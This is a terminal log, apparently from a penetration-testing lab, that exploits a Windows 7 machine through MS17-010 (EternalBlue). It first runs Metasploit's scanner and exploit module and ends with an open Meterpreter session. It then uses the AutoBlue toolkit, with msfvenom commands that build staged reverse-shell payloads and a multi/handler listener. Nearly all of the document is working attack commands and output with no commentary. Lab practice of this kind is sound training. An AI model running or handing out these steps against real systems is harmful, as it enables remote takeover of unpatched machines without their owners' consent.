PROCEDURE FOLLOWED : 

1. MSFCONSOLE

msf6 > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 3
msf6 auxiliary(scanner/smb/smb_ms17_010) > options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                Required  Description
   ----         ---------------                                --------  -----------
   CHECK_ARCH   true                                           no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                           no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                          no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlist  yes       List of named pipes to check
                s/named_pipes.txt
   RHOSTS                                                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/u
                                                                         sing-metasploit.html
   RPORT        445                                            yes       The SMB service port (TCP)
   SMBDomain    .                                              no        The Windows domain to use for authentication
   SMBPass                                                     no        The password for the specified username
   SMBUser                                                     no        The username to authenticate as
   THREADS      1                                              yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOST 192.168.1.4
RHOST => 192.168.1.4
msf6 auxiliary(scanner/smb/smb_ms17_010) > set threads 16
threads => 16
msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit

[-] 192.168.1.4:445       - Rex::HostUnreachable: The host (192.168.1.4:445) was unreachable.
[*] 192.168.1.4:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit

[+] 192.168.1.4:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.4:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


msf6 auxiliary(scanner/smb/smb_ms17_010) > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 auxiliary(scanner/smb/smb_ms17_010) > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windo
                                             ws Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows E
                                             mbedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded St
                                             andard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.5      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.1.5
RHOST => 192.168.1.5
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.1.4
RHOST => 192.168.1.4
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.1.5:4444 
[*] 192.168.1.4:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.4:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.4:445       - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.1.4:445 - The target is vulnerable.
[*] 192.168.1.4:445 - Connecting to target for exploitation.
[+] 192.168.1.4:445 - Connection established for exploitation.
[+] 192.168.1.4:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.4:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.1.4:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.1.4:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.1.4:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.1.4:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.4:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.1.4:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.4:445 - Starting non-paged pool grooming
[+] 192.168.1.4:445 - Sending SMBv2 buffers
[+] 192.168.1.4:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.4:445 - Sending final SMBv2 buffers.
[*] 192.168.1.4:445 - Sending last fragment of exploit packet!
[*] 192.168.1.4:445 - Receiving response from exploit packet
[+] 192.168.1.4:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.4:445 - Sending egg to corrupted connection.
[*] 192.168.1.4:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 192.168.1.4
[*] Meterpreter session 1 opened (192.168.1.5:4444 -> 192.168.1.4:49159) at 2023-09-13 13:54:17 -0400
[+] 192.168.1.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=




2. AUTOBLUE

┌──(root㉿kali)-[~]
└─# git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
Cloning into 'AutoBlue-MS17-010'...
remote: Enumerating objects: 136, done.
remote: Counting objects: 100% (60/60), done.
remote: Compressing objects: 100% (24/24), done.
remote: Total 136 (delta 46), reused 36 (delta 36), pack-reused 76
Receiving objects: 100% (136/136), 101.12 KiB | 1.38 MiB/s, done.
Resolving deltas: 100% (80/80), done.
                                                                                                                                                             
┌──(root㉿kali)-[~]
└─# mv AutoBlue-MS17-010 Vulnerable_Machines/Blue_PEH 

┌──(root㉿kali)-[~]
└─# cd Vulnerable_Machines/Blue_PEH 
                                                                                                                                                             
┌──(root㉿kali)-[~/Vulnerable_Machines/Blue_PEH]
└─# cd AutoBlue-MS17-010                                                                                      
                                                                                                                                                             
┌──(root㉿kali)-[~/Vulnerable_Machines/Blue_PEH/AutoBlue-MS17-010]
└─# ls
eternalblue_exploit10.py  eternalblue_exploit8.py  LICENSE           mysmb.py   requirements.txt  zzz_exploit.py
eternalblue_exploit7.py   eternal_checker.py       listener_prep.sh  README.md  shellcode
                                                                                                                                                             
┌──(root㉿kali)-[~/Vulnerable_Machines/Blue_PEH/AutoBlue-MS17-010]
└─# pip install -r requirements.txt
Requirement already satisfied: impacket in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (0.11.0)
Requirement already satisfied: dsinternals in /usr/lib/python3/dist-packages (from impacket->-r requirements.txt (line 1)) (1.2.4)
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv                                                                                             
                                                                                                                                                             
┌──(root㉿kali)-[~/Vulnerable_Machines/Blue_PEH/AutoBlue-MS17-010]
└─# python eternal_checker.py      
usage: eternal_checker.py [-h] [-target-ip ip address] [-port [destination port]] target

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help            show this help message and exit

connection:
  -target-ip ip address
                        IP Address of the target machine. If ommited it will use whatever was specified as target. This is useful when target is the
                        NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server
                                                                                                                                                             
┌──(root㉿kali)-[~/Vulnerable_Machines/Blue_PEH/AutoBlue-MS17-010]
└─# python eternal_checker.py 192.168.1.4
[*] Target OS: Windows 7 Ultimate 7601 Service Pack 1
[!] The target is not patched
=== Testing named pipes ===
[*] Done

┌──(root㉿kali)-[~/Vulnerable_Machines/Blue_PEH/AutoBlue-MS17-010]
└─# cd shellcode        
                                                                                                                                                             
┌──(root㉿kali)-[~/Vulnerable_Machines/Blue_PEH/AutoBlue-MS17-010/shellcode]
└─# ls
eternalblue_kshellcode_x64.asm  eternalblue_kshellcode_x86.asm  eternalblue_sc_merge.py  shell_prep.sh
                                                                                                                                                             
┌──(root㉿kali)-[~/Vulnerable_Machines/Blue_PEH/AutoBlue-MS17-010/shellcode]
└─# ./shell_prep.sh                  
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
LHOST for reverse connection:
192.168.1.5
LPORT you want x64 to listen on:
4444
LPORT you want x86 to listen on:
5555
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
0
Generating x64 cmd shell (staged)...

msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=192.168.1.5 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 511 bytes
Saved as: sc_x64_msf.bin

Generating x86 cmd shell (staged)...

msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=192.168.1.5 LPORT=5555
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 375 bytes
Saved as: sc_x86_msf.bin

MERGING SHELLCODE WOOOO!!!
DONE
                                                                                                                                                             
┌──(root㉿kali)-[~/Vulnerable_Machines/Blue_PEH/AutoBlue-MS17-010/shellcode]
└─# cd ..       
                                                                                                                                                             
┌──(root㉿kali)-[~/Vulnerable_Machines/Blue_PEH/AutoBlue-MS17-010]
└─# ls
eternalblue_exploit10.py  eternalblue_exploit8.py  LICENSE           mysmb.py     README.md         shellcode
eternalblue_exploit7.py   eternal_checker.py       listener_prep.sh  __pycache__  requirements.txt  zzz_exploit.py
                                                                                                                                                             
┌──(root㉿kali)-[~/Vulnerable_Machines/Blue_PEH/AutoBlue-MS17-010]
└─# ./listener_prep.sh 
  __
  /,-
  ||)
  \\_, )
   `--'
Enternal Blue Metasploit Listener

LHOST for reverse connection:
192.168.1.5
LPORT for x64 reverse connection:
4444
LPORT for x86 reverse connection:
5555
Enter 0 for meterpreter shell or 1 for regular cmd shell:
1
Type 0 if this is a staged payload or 1 if it is for a stageless payload
0
Starting listener (staged)...
Starting postgresql (via systemctl): postgresql.service.
                                                  

                                   .,,.                  .                                                                                                   
                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P                                                                                
                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p                                                                              
                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'                                                                                 
  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P                                                                                 
  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b                                                                             
 d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b                                                                                
d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88                                                                                     
                          .a#$$$$$$"`          88b  d8P  88b`?8888P'                                                                                         
                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:                                                                                
                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'                                                                              
                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'                                                                               
              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'                                                                                
           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'                                                                                 
_______________________________________________________________   ,&$$$$$$'_____                                                                             
                                                                 ll&&$$$$'                                                                                   
                                                              .;;lll&&&&'                                                                                    
                                                            ...;;lllll&'                                                                                     
                                                          ......;;;llll;;;....                                                                               
                                                           ` ......;;;;... .  .                                                                              
                                                                                                                                                             

       =[ metasploit v6.3.31-dev                          ]
+ -- --=[ 2346 exploits - 1220 auxiliary - 413 post       ]
+ -- --=[ 1390 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: After running db_nmap, be sure to 
check out the result of hosts and services
Metasploit Documentation: https://docs.metasploit.com/

[*] Processing config.rc for ERB directives.
resource (config.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (config.rc)> set PAYLOAD windows/x64/shell/reverse_tcp
PAYLOAD => windows/x64/shell/reverse_tcp
resource (config.rc)> set LHOST 192.168.1.5
LHOST => 192.168.1.5
resource (config.rc)> set LPORT 4444
LPORT => 4444
resource (config.rc)> set ExitOnSession false
ExitOnSession => false
resource (config.rc)> set EXITFUNC thread
EXITFUNC => thread
resource (config.rc)> exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
resource (config.rc)> set PAYLOAD windows/shell/reverse_tcp
PAYLOAD => windows/shell/reverse_tcp
resource (config.rc)> set LPORT 5555
[*] Started reverse TCP handler on 192.168.1.5:4444 
LPORT => 5555
resource (config.rc)> exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.1.5:5555 
msf6 exploit(multi/handler) > 